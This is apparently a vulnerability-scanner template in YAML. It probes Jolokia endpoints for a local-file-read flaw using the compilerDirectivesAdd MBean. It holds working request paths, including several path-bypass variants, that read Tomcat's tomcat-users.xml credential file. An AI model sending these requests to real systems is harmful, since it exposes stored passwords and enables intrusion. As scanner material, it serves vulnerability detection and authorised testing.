http:
- matchers:
  - condition: and
    type: word
    words:
    - mbean
    - request
    - password
    - roles
  method: GET
  path:
  - '{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  - '{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  - '{{BaseURL}}/..;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  - '{{BaseURL}}/staff/..;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  - '{{BaseURL}}/;/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  - '{{BaseURL}}/%2e/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/usr!/local!/tomcat!/conf!/tomcat-users.xml'
  stop-at-first-match: true
id: jolokia-reader-files
info:
  author: reewardius
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Jolokia is vulnerable to local file reader via compilerDirectivesAdd.
  name: Jolokia - Local File Reader
  reference:
  - https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/
  - https://github.com/laluka/jolokia-exploitation-toolkit
  - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
  severity: high
  tags: lfi,lfr,java,jolokia
